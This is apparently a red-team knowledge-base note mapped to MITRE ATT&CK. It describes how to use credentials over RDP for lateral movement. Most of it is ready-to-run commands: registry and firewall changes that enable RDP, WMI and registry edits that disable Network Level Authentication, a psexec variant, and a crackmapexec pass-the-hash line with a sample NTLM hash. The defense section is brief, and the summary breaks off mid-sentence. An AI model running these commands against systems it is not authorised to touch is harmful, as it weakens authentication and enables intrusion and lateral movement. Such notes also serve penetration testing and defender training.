---
id: 02c2d498-2932-4566-8491-677a256eaec7
name: Windows RDP Credential Usage
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:31.045164+00:00'
updated_at: '2023-04-10T20:37:56.729452+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
- '[[Brute Force|T1110 - Brute Force]]'
- '[[Remote Desktop Protocol|T1076 - Remote Desktop Protocol]]'
tags:
- '[[RDP Remote Desktop Protocol]]'
- '[[Windows - Using credentials]]'
commands:
- '[[Disable NLA]]'
- '[[Enable RDP]]'
- '[[Fix CredSSP errors]]'
---

# Windows RDP Credential Usage

## Summary

The Windows RDP Credential Usage procedure is used to remotely access a Windows machine using the Remote Desktop Protocol (RDP) with valid credentials. This technique is commonly used by attackers to gain access to a target machine and move laterally within a network. The technical process involves

## Description

# Description

The Windows RDP Credential Usage procedure is used to remotely access a Windows machine using the Remote Desktop Protocol (RDP) with valid credentials. This technique is commonly used by attackers to gain access to a target machine and move laterally within a network. The technical process involves enabling the RDP service on the target machine and fixing any CredSSP errors that may arise. 

From a business perspective, this procedure can be used by system administrators to remotely manage machines within an organization. However, it's important to keep in mind the potential security risks associated with remote access and ensure that proper security measures are in place.

## Requirements

1. Valid credentials with remote access privileges

1. Access to the target machine's network

## Defense

1. Enforce strong password policies to prevent brute force attacks

1. Use multi-factor authentication to add an extra layer of security

1. Limit the number of users with remote access privileges and monitor their activity

## Objectives

1. Remotely access a Windows machine using RDP

1. Move laterally within a network

# Instructions

1. To enable RDP and fix CredSSP errors, run the following commands:
1. To enable RDP:
   - Run the command 'reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f'
   - Run the command 'netsh firewall set service remoteadmin enable'
   - Run the command 'netsh firewall set service remotedesktop enable'
2. To fix CredSSP errors:
   - Run the command 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
   - Run the command 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f'
3. To disable NLA:
   - Run the command '(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "<ComputerName>" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired'
   - Run the command '(Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "<ComputerName>" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)'

**Code**: [[# Enable RDP
PS C:\> reg add "HKLM\System\CurrentC]]

> This command is used to enable RDP and fix CredSSP errors on a remote machine. The 'reg add' command adds a new registry entry, 'fDenyTSConnections', to the specified registry key. The 'netsh firewall' commands enable the Remote Desktop and Remote Administration services in the Windows Firewall. The 'Get-WmiObject' command retrieves the Terminal Services General Setting object for the specified computer and the 'SetUserAuthenticationRequired' method is used to disable NLA on the RDP-Tcp connection.

**Command** ([[Enable RDP]]):

```powershell
PS C:\> reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x00000000 /f
PS C:\> netsh firewall set service remoteadmin enable
PS C:\> netsh firewall set service remotedesktop enable
# Alternative
C:\> psexec \\machinename reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0
root@payload$ crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
```

**Command** ([[Fix CredSSP errors]]):

```bash
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```

**Command** ([[Disable NLA]]):

```powershell
PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").UserAuthenticationRequired
PS > (Get-WmiObject -class "Win32_TSGeneralSetting" -Namespace root\cimv2\terminalservices -ComputerName "PC01" -Filter "TerminalName='RDP-tcp'").SetUserAuthenticationRequired(0)
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Lateral Movement|TA0008 - Lateral Movement]]

### Techniques

- [[Brute Force|T1110 - Brute Force]]
- [[Remote Desktop Protocol|T1076 - Remote Desktop Protocol]]

## Commands Used

- [[Disable NLA]]
- [[Enable RDP]]
- [[Fix CredSSP errors]]

## Tags

- [[RDP Remote Desktop Protocol]]
- [[Windows - Using credentials]]
